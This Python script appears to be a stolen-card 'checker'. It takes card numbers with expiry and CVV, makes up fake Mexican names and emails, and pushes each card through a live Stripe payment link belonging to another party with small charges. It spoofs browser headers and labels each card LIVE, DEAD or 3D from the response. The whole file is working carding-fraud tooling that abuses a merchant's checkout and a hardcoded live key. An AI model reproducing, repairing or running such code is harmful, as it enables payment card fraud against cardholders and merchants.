import requests, string, random
from faker import Faker
fk = Faker("es_MX")


def mails():
    dominios = ['hotmail.com', 'gmail.com', 'outlook.com', 'yahoo.com']
    nombre_usuario = fk.user_name().replace(" ", "").replace(".", "").replace("-", "").lower()
    dominio = random.choice(dominios)
    correo = f"{nombre_usuario}@{dominio}"
    return correo
    #Esta función retorna un email (ej. emilioi722@hotmail.com)
def name():
    ns = fk.first_name()
    sk = fk.last_name()
    name = f"{ns} {sk}"
    name = name.replace(" ", ("+"))
    return name

def main(card):
    try:
        ses = requests.Session()
        car = card
        actd = car.strip().split("|")
        tar, mes, ano, cv = actd
        
        url0 = "https://m.stripe.com/6"
        headers0 = {
  "Host": "m.stripe.com", "Connection": "keep-alive","sec-ch-ua-platform": "\"Linux\"","User-Agent": "Mozilla/5.0 (Linux 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36","sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"", "Content-Type": "text/plain;charset=UTF-8","sec-ch-ua-mobile": "?1","Accept": "*/*", "Sec-GPC": "1","Accept-Language": "es-MX,es;q=0.9", "Origin": "https://m.stripe.network","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Sec-Fetch-Storage-Access": "inactive","Referer": "https://m.stripe.network/",
        }
        data0 = """sesd&id"""
        res0 = ses.post(url0, headers=headers0, data=data0)
        muid = res0.json().get("muid")
        sid = res0.json().get("sid")
        guid = res0.json().get("guid")
        
        url1 = "https://merchant-ui-api.stripe.com/payment-links/7sI9CW2QL1Y32ju009"
        headers1 = {
  "Host": "merchant-ui-api.stripe.com","Connection": "keep-alive","sec-ch-ua-platform": "\"Android\"","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36","Accept": "application/json", "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"","Content-Type": "application/x-www-form-urlencoded", "sec-ch-ua-mobile": "?1","Sec-GPC": "1","Accept-Language": "es-MX,es;q=0.9","Origin": "https://buy.stripe.com","Sec-Fetch-Site": "same-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://buy.stripe.com/","Accept-Encoding": "gzip, deflate, br, zstd"
        }
        data1 = """eid=NA&browser_locale=es-MX&referrer_origin=https%3A%2F%2Fopenmrs.org&is_mobile_view=true"""
        res1 = ses.post(url1, headers=headers1, data=data1)
        cs = res1.json().get("session_id")
        li = res1.json()['line_item_group']['line_items'][0]['id']
     
        url00= f"https://api.stripe.com/v1/payment_pages/{cs}"
        headers00 = {
  "Host": "api.stripe.com",
  "Connection": "keep-alive",
  "sec-ch-ua-platform": "\"Android\"",
  "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
  "Accept": "application/json",
  "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
  "Content-Type": "application/x-www-form-urlencoded",
  "sec-ch-ua-mobile": "?1",
  "Sec-GPC": "1",
  "Accept-Language": "es-MX,es;q=0.9",
  "Origin": "https://buy.stripe.com",
  "Sec-Fetch-Site": "same-site",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Dest": "empty",
  "Referer": "https://buy.stripe.com/",
  "Accept-Encoding": "gzip, deflate, br, zstd"
        }
        data00 = f"""eid=NA&updated_line_item_amount[line_item_id]={li}&updated_line_item_amount[unit_amount]=500&key=pk_live_51JHbs1Ct5n6AtwexUOMBvbaD29zY7IiRxfqvxCNIaT7NyH5WAqoef8GbYwCAbH4dzntrIuxgt1VteaKZDPSuhLaf00O3UpleYm"""
        res00 = ses.post(url00, headers=headers00, data=data00)
       
        url2 = "https://api.stripe.com/v1/payment_methods"
        headers2 = {
  "Host": "api.stripe.com","Connection": "keep-alive", "sec-ch-ua-platform": "\"Android\"","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36", "Accept": "application/json","sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"", "Content-Type": "application/x-www-form-urlencoded", "sec-ch-ua-mobile": "?1","Sec-GPC": "1", "Accept-Language": "es-MX,es;q=0.9", "Origin": "https://buy.stripe.com", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty","Referer": "https://buy.stripe.com/", "Accept-Encoding": "gzip, deflate, br, zstd"
        }
        data2 = f"""type=card&card[number]={tar}&card[cvc]={cv}&card[exp_month]={mes}&card[exp_year]={ano}&billing_details[name]={name()}&billing_details[email]={mails()}&billing_details[address][country]=MX&guid={guid}&muid={muid}&sid={sid}&key=pk_live_51JHbs1Ct5n6AtwexUOMBvbaD29zY7IiRxfqvxCNIaT7NyH5WAqoef8GbYwCAbH4dzntrIuxgt1VteaKZDPSuhLaf00O3UpleYm&payment_user_agent=stripe.js%2Fc0b5539ba7%3B+stripe-js-v3%2Fc0b5539ba7%3B+payment-link%3B+checkout"""
        res2 = ses.post(url2, headers=headers2, data=data2)
        pm = res2.json().get("id")
        
        
        url = f"https://api.stripe.com/v1/payment_pages/{cs}/confirm"
        headers = {
  "Host": "api.stripe.com","Connection": "keep-alive","sec-ch-ua-platform": "\"Android\"", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36", "Accept": "application/json","sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"","Content-Type": "application/x-www-form-urlencoded", "sec-ch-ua-mobile": "?1", "Sec-GPC": "1", "Accept-Language": "es-MX,es;q=0.9","Origin": "https://buy.stripe.com","Sec-Fetch-Site": "same-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://buy.stripe.com/", "Accept-Encoding": "gzip, deflate, br, zstd"
        }
        data = f"""eid=NA&payment_method={pm}&expected_amount=500&last_displayed_line_item_group_details[subtotal]=500&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&tax_id_collection[purchasing_as_business]=false&expected_payment_method_type=card&guid={guid}&muid={muid}&sid={sid}&key=pk_live_51JHbs1Ct5n6AtwexUOMBvbaD29zY7IiRxfqvxCNIaT7NyH5WAqoef8GbYwCAbH4dzntrIuxgt1VteaKZDPSuhLaf00O3UpleYm&referrer=https%3A%2F%2Fopenmrs.org"""
        res = ses.post(url, headers=headers, data=data)
        if "Your card was declined." in res.text:
            return f"[red]{card} - DEAD - MESSAGE: Your card was declined. ❌"
        elif "Your card's security code is incorrect." in res.text:
            return f"[green]{card} - LIVE  - STATUS: Your card's security code is incorrect. ✅"
        elif "BEGIN CERTIFICATE" in res.text:
            return f"[yellow]{card} - 3D - STATUS: 3D REDIRECT "
        elif 'error' in res.text:
            return f"[red]{card} - CUS - STATUS: {res.json()["error"]["message"]}"
        else:
            return f"[green]{card} - LIVE - STATUS: LIVE ✅"
    except Exception as e:
        return f'[#FAA500]{card} - REQUESTS FAILED OR POSSIBLE 3D'
    finally:
        ses.close()
